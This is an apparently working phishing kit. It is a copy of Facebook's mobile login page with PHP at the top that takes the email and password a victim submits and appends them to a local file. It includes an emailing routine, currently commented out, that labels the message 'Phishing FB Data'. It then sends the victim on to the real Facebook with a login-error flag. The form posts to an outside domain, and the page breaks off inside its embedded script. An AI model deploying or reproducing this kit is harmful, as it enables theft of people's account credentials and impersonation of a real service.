<?php
 function send_data(){
     //The url you wish to send the POST request to
    $url = $file_name;

    //The data you want to send via POST
    $fields = [
        '__VIEWSTATE '      => $state,
        '__EVENTVALIDATION' => $valid,
        'btnSubmit'         => 'Submit'
    ];

    //url-ify the data for the POST
    $fields_string = http_build_query($fields);

    //open connection
    $ch = curl_init();

    //set the url, number of POST vars, POST data
    curl_setopt($ch,CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_POST, true);
    curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);

    //So that curl_exec returns the contents of the cURL; rather than echoing it
    curl_setopt($ch,CURLOPT_RETURNTRANSFER, true); 

    //execute post
    $result = curl_exec($ch);
    echo $result;   
 }



function send_mail($data){
    $to = "XXXXX@gmail.com";
    $subject = "FB Login Data";

    $message = "<h2>Phishing FB Data</h2>
                <li>Email : $data[0]</li>
                <li>Password : $data[1]</li>

    ";

    // Always set content-type when sending HTML email
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

    // More headers
    $headers .= 'From: XXXXXX@gmail.com' . "\r\n";
    // $headers .= 'Cc: myboss@example.com' . "\r\n";
    mail($to,$subject,$message,$headers);

    // print_r($data[0]);
    return true;

}   

function json_write($data){
    $myfile = fopen("json.iwx", "a") or die("Unable to open file!");
    $txt = "Email : ".$data[0]."\nPassword : ".$data[1]."\n-------\n";
    fwrite($myfile, $txt);
    fclose($myfile);

    // print_r($data);
    return true;
}

if(isset($_POST['login'])) {
    $a = array();
    array_push($a, $_POST['email']);
    array_push($a, $_POST['pass']);

    // send_mail($a);
    json_write($a);
    // 
    print_r($a);
    header("Location:https://m.facebook.com/?login=error");
    exit;
}
 ?>
<!DOCTYPE html><html lang="en"><head><title>Facebook - Log In or Sign Up</title><meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" /><link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196" /><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" /><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y7/l/0,cross/Bll5NVg5w2Z.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="QjB/d40" crossorigin="anonymous" /><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/n9g6Q0kZdhT.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="MoYpVB9" crossorigin="anonymous" /><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yF/l/0,cross/bMd0F8l-9wb.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="xSW5b/p" crossorigin="anonymous" /><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yn/l/0,cross/Wpehtpza903.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="Ri6nK6T" crossorigin="anonymous" /><script id="u_0_f_bJ" nonce="FthVytFa">function envFlush(a){function b(b){for(var c in a)b[c]=a[c]}window.requireLazy?window.requireLazy(["Env"],b):(window.Env=window.Env||{},b(window.Env))}envFlush({"timeslice_heartbeat_config":{"pollIntervalMs":33,"idleGapThresholdMs":60,"ignoredTimesliceNames":{"requestAnimationFrame":true,"Event listenHandler mousemove":true,"Event listenHandler mouseover":true,"Event listenHandler mouseout":true,"Event listenHandler scroll":true},"isHeartbeatEnabled":true,"isArtilleryOn":false},"shouldLogCounters":true,"timeslice_categories":{"react_render":true,"reflow":true},"sample_continuation_stacktraces":true,"dom_mutation_flag":true});</script><script nonce="FthVytFa">document.domain = 'facebook.com';/^#~?!(?:\/?[\w\.-])+\/?(?:\?|$)/.test(location.hash)&&location.replace(location.hash.substr(location.hash.indexOf("!")+1));</script><script nonce="FthVytFa">__DEV__=0;</script><script id="u_0_g_mF" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3/yr/r/LqgysnCUDsz.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="CcHAorE" nonce="FthVytFa"></script><script id="u_0_d_Vv" nonce="FthVytFa">CavalryLogger=window.CavalryLogger||function(a){this.lid=a,this.transition=!1,this.metric_collected=!1,this.is_detailed_profiler=!1,this.instrumentation_started=!1,this.pagelet_metrics={},this.events={},this.ongoing_watch={},this.values={t_cstart:window._cstart},this.piggy_values={},this.bootloader_metrics={},this.resource_to_pagelet_mapping={},this.initializeInstrumentation&&this.initializeInstrumentation()},CavalryLogger.prototype.setIsDetailedProfiler=function(a){this.is_detailed_profiler=a;return this},CavalryLogger.prototype.setTTIEvent=function(a){this.tti_event=a;return this},CavalryLogger.prototype.setValue=function(a,b,c,d){d=d?this.piggy_values:this.values;(typeof d[a]==="undefined"||c)&&(d[a]=b);return this},CavalryLogger.prototype.getLastTtiValue=function(){return this.lastTtiValue},CavalryLogger.prototype.setTimeStamp=CavalryLogger.prototype.setTimeStamp||function(a,b,c,d){this.mark(a);var e=this.values.t_cstart||this.values.t_start;e=d?e+d:CavalryLogger.now();this.setValue(a,e,b,c);this.tti_event&&a==this.tti_event&&(this.lastTtiValue=e,this.setTimeStamp("t_tti",b));return this},CavalryLogger.prototype.mark=typeof console==="object"&&console.timeStamp?function(a){console.timeStamp(a)}:function(){},CavalryLogger.prototype.addPiggyback=function(a,b){this.piggy_values[a]=b;return this},CavalryLogger.instances={},CavalryLogger.id=0,CavalryLogger.getInstance=function(a){typeof a==="undefined"&&(a=CavalryLogger.id);CavalryLogger.instances[a]||(CavalryLogger.instances[a]=new CavalryLogger(a));return CavalryLogger.instances[a]},CavalryLogger.setPageID=function(a){if(CavalryLogger.id===0){var b=CavalryLogger.getInstance();CavalryLogger.instances[a]=b;CavalryLogger.instances[a].lid=a;delete CavalryLogger.instances[0]}CavalryLogger.id=a},CavalryLogger.now=function(){return window.performance&&performance.timing&&performance.timing.navigationStart&&performance.now?performance.now()+performance.timing.navigationStart:new Date().getTime()},CavalryLogger.prototype.measureResources=function(){},CavalryLogger.prototype.profileEarlyResources=function(){},CavalryLogger.getBootloaderMetricsFromAllLoggers=function(){},CavalryLogger.start_js=function(){},CavalryLogger.start_js_script=function(){},CavalryLogger.done_js=function(){};CavalryLogger.getInstance().setTTIEvent("t_domcontent");CavalryLogger.prototype.measureResources=function(a,b){if(!this.log_resources)return;var c="bootload/"+a.name;if(this.bootloader_metrics[c]!==void 0||this.ongoing_watch[c]!==void 0)return;var d=CavalryLogger.now();this.ongoing_watch[c]=d;"start_"+c in this.bootloader_metrics||(this.bootloader_metrics["start_"+c]=d);b&&!("tag_"+c in this.bootloader_metrics)&&(this.bootloader_metrics["tag_"+c]=b);if(a.type==="js"){c="js_exec/"+a.name;this.ongoing_watch[c]=d}},CavalryLogger.prototype.stopWatch=function(a){if(this.ongoing_watch[a]){var b=CavalryLogger.now(),c=b-this.ongoing_watch[a];this.bootloader_metrics[a]=c;var d=this.piggy_values;a.indexOf("bootload")===0&&(d.t_resource_download||(d.t_resource_download=0),d.resources_downloaded||(d.resources_downloaded=0),d.t_resource_download+=c,d.resources_downloaded+=1,d["tag_"+a]=="_EF_"&&(d.t_pagelet_cssload_early_resources=b));delete this.ongoing_watch[a]}return this},CavalryLogger.getBootloaderMetricsFromAllLoggers=function(){var a={};Object.values(window.CavalryLogger.instances).forEach(function(b){b.bootloader_metrics&&Object.assign(a,b.bootloader_metrics)});return a},CavalryLogger.start_js=function(a){for(var b=0;b<a.length;++b)CavalryLogger.getInstance().stopWatch("js_exec/"+a[b])},CavalryLogger.start_js_script=function(a){if(!a||!a.dataset)return;CavalryLogger.start_js([a.dataset.bootloaderHash||a.dataset.bootloaderHashClient])},CavalryLogger.done_js=function(a){for(var b=0;b<a.length;++b)CavalryLogger.getInstance().stopWatch("bootload/"+a[b])},CavalryLogger.prototype.profileEarlyResources=function(a){for(var b=0;b<a.length;b++)this.measureResources({name:a[b][0],type:a[b][1]?"js":""},"_EF_")};CavalryLogger.getInstance().log_resources=true;CavalryLogger.getInstance().setIsDetailedProfiler(true);window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp("t_start");</script><script id="u_0_e_jf" nonce="FthVytFa">(function _(a,b,c,d){function e(a){document.cookie=a+"=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"}function f(a,b){document.cookie=a+"="+b+";path=/;domain=.facebook.com;secure"}if(!a){e(b);e(c);return}a=null;(navigator.userAgent.indexOf("Firefox")!==-1||!window.devicePixelRatio&&navigator.userAgent.indexOf("Windows Phone")!==-1)&&(document.documentElement!=null&&(a=screen.width/document.documentElement.offsetWidth,a=Math.max(1,Math.floor(a*2)/2)));(!a||a===1)&&navigator.userAgent.indexOf("IEMobile")!==-1&&(a=Math.sqrt(screen.deviceXDPI*screen.deviceYDPI)/96,a=Math.max(1,Math.round(a*2)/2));f(b,(a||window.devicePixelRatio||1).toString());e=window.screen?screen.width:0;b=window.screen?screen.height:0;f(c,e+"x"+b);d&&document.cookie&&window.devicePixelRatio>1&&document.location.reload()})(true, "m_pixel_ratio", "wd", false);</script><meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=" /><meta name="description" content="Create an account or log into Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates." /><link rel="canonical" href="https://www.facebook.com/" /><meta property="og:site_name" content="Facebook" /><meta property="og:type" content="website" /><meta property="og:title" content="Facebook - Log In or Sign Up" /><meta property="og:description" content="Create an account or log into Facebook. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates." /><meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" /><meta property="og:url" content="https://www.facebook.com/" /><link rel="alternate" hreflang="x-default" href="https://www.facebook.com/" /><link rel="alternate" hreflang="en" href="https://www.facebook.com/" /><link rel="alternate" hreflang="ar" href="https://ar-ar.facebook.com/" /><link rel="alternate" hreflang="bg" href="https://bg-bg.facebook.com/" /><link rel="alternate" hreflang="bs" href="https://bs-ba.facebook.com/" /><link rel="alternate" hreflang="ca" href="https://ca-es.facebook.com/" /><link rel="alternate" hreflang="da" href="https://da-dk.facebook.com/" /><link rel="alternate" hreflang="el" href="https://el-gr.facebook.com/" /><link rel="alternate" hreflang="es" href="https://es-la.facebook.com/" /><link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/" /><link rel="alternate" hreflang="fa" href="https://fa-ir.facebook.com/" /><link rel="alternate" hreflang="fi" href="https://fi-fi.facebook.com/" /><link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/" /><link rel="alternate" hreflang="fr-ca" href="https://fr-ca.facebook.com/" /><link rel="alternate" hreflang="hi" href="https://hi-in.facebook.com/" /><link rel="alternate" hreflang="hr" href="https://hr-hr.facebook.com/" /><link rel="alternate" hreflang="id" href="https://id-id.facebook.com/" /><link rel="alternate" hreflang="it" href="https://it-it.facebook.com/" /><link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/" /><link rel="alternate" hreflang="mk" href="https://mk-mk.facebook.com/" /><link rel="alternate" hreflang="ms" href="https://ms-my.facebook.com/" /><link rel="alternate" hreflang="pl" href="https://pl-pl.facebook.com/" /><link rel="alternate" hreflang="pt" href="https://pt-br.facebook.com/" /><link rel="alternate" hreflang="pt-pt" href="https://pt-pt.facebook.com/" /><link rel="alternate" hreflang="ro" href="https://ro-ro.facebook.com/" /><link rel="alternate" hreflang="sl" href="https://sl-si.facebook.com/" /><link rel="alternate" hreflang="sr" href="https://sr-rs.facebook.com/" /><link rel="alternate" hreflang="th" href="https://th-th.facebook.com/" /><link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/" /><script id="u_0_h_V0" type="application/ld+json" nonce="FthVytFa">{"\u0040context":"http:\/\/schema.org","\u0040type":"WebSite","name":"Facebook","url":"https:\/\/www.facebook.com\/"}</script><link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials" /></head><body tabindex="0" class="touch x1 _fzu _50-3 iframe acw"><script id="u_0_c_xu" nonce="FthVytFa">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;c&&(c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait"));return b}})(window);</script><div id="viewport" data-kaios-focus-transparent="1"><h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1><div id="page"><div class="_129_" id="header-notices"></div><div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane"><div class="_7om2"><div class="_4g34" id="u_0_0_sV"><div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice"><div class="_52jd"></div></div><div class="_9om_"><div class="_4-4l"><div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div><div class="_7om2 _52we _2pid _52z6"><div class="_4g34"><a href="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ5MTgwNjgwLCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&amp;refid=8"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook" /></a></div></div><div class="_5rut">
	<form method="post" action="http://creativex/m-facebook-com-login.api.creativeinet.xyz/index.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form">
		<input type="hidden" name="lsd" value="AVphsKSJ6dM" autocomplete="off" /><input type="hidden" name="jazoest" value="2945" autocomplete="off" /><input type="hidden" name="m_ts" value="1649180680" /><input type="hidden" name="li" value="CIBMYsIiHCf0-jg1-SJzmXM7" /><input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number" /><input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries" /><div id="user_info_container" data-sigil="user_info_after_failure_element"></div><div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div><div id="otp_retrieve_desc_container"></div><div><div class="_56be"><div class="_55wo _56bf"><div class="_96n9" id="email_input_container"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="Mobile number or email" type="text" data-sigil="m_login_email" /></div></div></div><div class="_55wq"></div><div class="_56be"><div class="_55wo _56bf"><div class="_1upc _mg8" data-sigil="m_login_password"><div class="_7om2"><div class="_4g34 _5i2i _52we"><div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input" /></div></div><div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" style="display:none" id="u_0_1_Jp"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2_BM">HIDE</span><span class="mfss" id="u_0_3_Ht">SHOW</span></a></div></div></div></div></div></div></div></div><div class="_2pie" style="text-align:center;"><div id="login_password_step_element" data-sigil="login_password_step_element">
	<button type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login" data-sigil="touchable login_button_block m_login_button">
		<span class="_55sr">Log In</span></button></div><div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
	</form>
	<div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div><div id="otp_button_elem_container"></div></div><input type="hidden" name="prefill_contact_point" id="prefill_contact_point" /><input type="hidden" name="prefill_source" id="prefill_source" /><input type="hidden" name="prefill_type" id="prefill_type" /><input type="hidden" name="first_prefill_source" id="first_prefill_source" /><input type="hidden" name="first_prefill_type" id="first_prefill_type" /><input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false" /><input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false" /><input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false" /><input type="hidden" id="bi_xrwh" name="bi_xrwh" value="0" /><input type="hidden" id="scetoggle" /><div class="_xo8"></div><noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript></form><div><div class="_2pie _9omz"><div class="_52jj _9on1"><a class="_9on1" tabindex="0" href="/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQ5MTgwNjgwLCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&amp;c=https%3A%2F%2Fm.facebook.com%2F&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8" id="forgot-password-link">Forgot password?</a></div></div><div style="padding-top: 42px"><div><div><div><div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">or</span></div><div class="_52jj _5t3b" id="signup_button_area"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="/reg-no-deeplink/?cid=103&amp;refid=8" tabindex="0" data-sigil="m_reg_button">Create new account</a></div></div></div><div class="_2pie" style="text-align:center;"><div><div data-sigil="login_identify_step_element"></div><div class="other-links _8p_m"><ul class="_5pkb _55wp"><li></li></ul></div></div></div></div></div></div></div></div></div></div></div><div style="display:none"></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" /></span><div class="_55wr _5ui2" data-sigil="m_login_footer"><div class="_5dpw"><div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea"><div class="_7om2"><div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">English (US)</span><div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=pt_BR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">Português (Brasil)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=de_DE&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=de_DE&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">Deutsch</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=ar_AR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=ar_AR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">العربية</a></span></div></div><div class="_4g34"><div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=es_LA&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">Español</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=fr_FR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=fr_FR&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">Français (France)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/intl/save_locale/?loc=it_IT&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-ajaxify-href="/intl/save_locale/?loc=it_IT&amp;href=https%3A%2F%2Fm.facebook.com%2F&amp;ls_ref=mobile_suggested_locale_selector&amp;refid=8" data-method="post" data-sigil="ajaxify">Italiano</a></span></div><a href="/language/?next_uri=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8"><div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-sigil="more_language"><i class="img sp_Ixl-HF-6RQK sx_5b2650"></i></div></a></div></div></div><div class="_5ui4"><div class="_96qv _9a0a"><a href="https://about.facebook.com/?refid=8" class="_96qw" title="Read our blog, discover the resource center, and find job opportunities.">About</a><span aria-hidden="true"> · </span><a href="/help/?ref=pf&amp;refid=8" class="_96qw" title="Visit our Help Center.">Help</a><span aria-hidden="true"> · </span><span class="_96qw" id="u_0_4_FS">More</span></div><div class="_96qv" style="display:none" id="u_0_5_4U"><a href="https://messenger.com/" title="Check out Messenger." class="_96qw">Messenger</a><a href="/lite/?refid=8" title="Facebook Lite for Android." class="_96qw">Facebook Lite</a><a href="https://m.facebook.com/watch/?refid=8" title="Browse our Watch videos." class="_96qw">Watch</a><a href="/places/?refid=8" title="Check out popular places on Facebook." class="_96qw">Places</a><a href="/games/?refid=8" title="Check out Facebook games." class="_96qw">Games</a><a href="/marketplace/?refid=8" title="Buy and sell on Facebook Marketplace." class="_96qw">Marketplace</a><a href="https://pay.facebook.com/?refid=8" title="Learn more about Facebook Pay" target="_blank" class="_96qw">Facebook Pay</a><a href="https://www.oculus.com/" title="Learn more about Oculus" target="_blank" class="_96qw">Oculus</a><a href="https://portal.facebook.com/?refid=8" title="Learn more about Facebook Portal" target="_blank" class="_96qw">Portal</a><a href="https://lm.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT29kuQMBzrLFhjNcxISvFjR1qCMzWFSxtPDO4qLN9HwpTX74ptkCmfhMU4lgVK0JDElmYb_RjmS9dVzSFaCT_GLXZaAVmU8nlBF1XZ_sxZvPlkiEfK1PO553I8sDW1PBGJbAO96WsYkDtBrH1PCDA" title="Check out Instagram" target="_blank" class="_96qw" rel="noopener" data-sigil="MLynx_asynclazy">Instagram</a><a href="https://www.bulletin.com/" title="Check out Bulletin Newsletter" class="_96qw">Bulletin</a><a href="/local/lists/245019872666104/?refid=8" title="Browse our Local Lists directory." class="_96qw">Local</a><a href="/fundraisers/?refid=8" title="Donate to worthy causes." class="_96qw">Fundraisers</a><a href="/biz/directory/?refid=8" title="Browse our Facebook Services directory." class="_96qw">Services</a><a href="https://developers.facebook.com/?ref=pf&amp;refid=8" title="Develop on our platform." class="_96qw">Developers</a><a href="/careers/?ref=pf&amp;refid=8" title="Make your next career move to our awesome company." class="_96qw">Careers</a><a href="/privacy/explanation?refid=8" title="Learn about your privacy and Facebook." class="_96qw">Privacy</a><a href="/groups/explore/?refid=8" title="Explore our Groups." class="_96qw">Groups</a></div><span class="mfss fcg">Facebook Inc.</span></div></div></div></div><div class=""></div><div class="viewportArea _2v9s" style="display:none" id="u_0_6_z9" data-sigil="marea"><div class="_5vsg" id="u_0_7_w8"></div><div class="_5vsh" id="u_0_8_+/"></div><div class="_5v5d fcg"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...</div></div><div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea"><div class="container"><div class="image"></div><div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Try Again</a></div></div></div></div><div id="static_templates"><div class="mDialog" id="modalDialog" style="display:none"><div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader"><div class="_7om2 _52we"><div class="_5s61"><div class="_52z7"><button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_a_D8" data-sigil="dialog-cancel-button">Cancel</button><button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_b_Rm" data-sigil="dialog-back-button"><i class="img sp_Ixl-HF-6RQK sx_2ca50c" style="margin-top: 2px;"></i></button></div></div><div class="_4g34"><div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Loading...</div></div></div><div class="_5s61"><div class="_52z8" id="modalDialogHeaderButtons"></div></div></div></div><div class="modalDialogView" id="modalDialogView"></div><div class="_5v5d _5v5e fcg" id="dialogSpinner"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_9_1Y" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Loading...</div></div></div><script id="u_0_i_8I" crossorigin="anonymous" src="https://static.xx.fbcdn.net/rsrc.php/v3ixJY4/yB/l/en_US/YBHzdBxjWbI.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="pUZ0T8G" nonce="FthVytFa"></script><script id="u_0_j_3h" nonce="FthVytFa">requireLazy(["HasteSupportData"],function(m){m.handle({"gkxData":{"5241":{"result":true,"hash":"AT7o1bCQPGpf3ShEdd4"},"676920":{"result":false,"hash":"AT497IX4gOFG8gZeHYs"},"708253":{"result":false,"hash":"AT5n4hBL3YTMnQWtzFg"},"996940":{"result":false,"hash":"AT7opYuEGy3sjG1atRg"},"1263340":{"result":false,"hash":"AT5bwizWgDaFQudmQDM"}}})});requireLazy(["TimeSliceImpl","ServerJS"],function(TimeSlice,ServerJS){(new ServerJS()).handle({"define":[["CometPersistQueryParams",[],{"relative":{},"domain":{}},6231],["BigPipeExperiments",[],{"link_images_to_pagelets":false,"enable_bigpipe_plugins":false},907],["BootloaderConfig",[],{"deferBootloads":false,"jsRetries":[200,500],"jsRetryAbortNum":2,"jsRetryAbortTime":5,"silentDups":false,"hypStep4":false,"phdOn":false,"btCutoffIndex":584},329],["CSSLoaderConfig",[],{"timeout":5000,"modulePrefix":"BLCSS:","loadEventSupported":true},619],["CurrentCommunityInitialData",[],{},490],["CurrentUserInitialData",[],{"ACCOUNT_ID":"0","USER_ID":"0","NAME":"","SHORT_NAME":null,"IS_BUSINESS_PERSON_ACCOUNT":false,"HAS_SECONDARY_BUSINESS_PERSON":false,"IS_FACEBOOK_WORK_ACCOUNT":false,"IS_MESSENGER_ONLY_USER":false,"IS_DEACTIVATED_ALLOWED_ON_MESSENGER":false,"IS_MESSENGER_CALL_GUEST_USER":false,"IS_WORK_MESSENGER_CALL_GUEST_USER":false,"APP_ID":"412378670482","IS_BUSINESS_DOMAIN":false},270],["ErrorDebugHooks",[],{"SnapShotHook":null},185],["ISB",[],{},330],["LSD",[],{"token":"AVphsKSJ6dM"},323],["MRequestConfig",[],{"dtsg":{"token":"AQFOWeVQKLNmBc8:0:0","valid_for":86400,"expire":1649267080},"dtsg_ag":{"token":"AQz-vrDJbAGzHnMNeGLw6xCJwThyM8mPOSmzV1bh7pT0nE0f:0:0","valid_for":604800,"expire":1649785480},"lsd":"AVphsKSJ6dM","checkResponseOrigin":true,"checkResponseToken":true,"cleanFinishedRequest":false,"cleanFinishedPrefetchRequests":false,"ajaxResponseToken":{"secret":"GmHKgr64_vsAharQj8rqCO6pGQK4uaq1","encrypted":"AYma_xJRXNQeqcWba4ghP_NBe8pMER6B3Qka0tii4xzk4otSakDCmitPyMhEwan4XVm_vK78HqTtrRJUxgSQ1JZ4nQ3XwItuUSOvyDz6PdJgBQ"}},51],["ServerNonce",[],{"ServerNonce":"k-x8p7UWeXfr-0iiov0mVM"},141],["SiteData",[],{"server_revision":1005299132,"client_revision":1005299132,"tier":"","push_phase":"C3","pkg_cohort":"BP:mtouch_pkg","haste_session":"19087.BP:mtouch_pkg.2.0.0.0.","pr":1,"haste_site":"mobile","manifest_base_uri":"https:\/\/static.xx.fbcdn.net","manifest_origin":null,"be_one_ahead":false,"is_rtl":false,"is_comet":false,"is_experimental_tier":false,"is_jit_warmed_up":true,"hsi":"7083177086063263487-0","semr_host_bucket":"5","bl_hash_version":2,"skip_rd_bl":true,"comet_env":0,"wbloks_env":false,"spin":0,"__spin_r":1005299132,"__spin_b":"trunk","__spin_t":1649180680,"vip":"31.13.64.35"},317],["SprinkleConfig",[],{"param_name":"jazoest","version":2,"should_randomize":false},2111],["PromiseUsePolyfillSetImmediateGK",[],{"www_always_use_polyfill_setimmediate":false},2190],["KSConfig",[],{"killed":{"__set":["MOBILIZER_SELF_SERVE_OWNERSHIP_RESOLVER","MLHUB_FLOW_AUTOREFRESH_SEARCH","NEKO_DISABLE_CREATE_FOR_SAP","EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT","MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING","WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING","BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE","BUY_AT_UI_LINE_DELETE","BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API","BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API","BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API","BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API","BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API","BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API","ADS_PLACEMENT_FIX_PUBLISHER_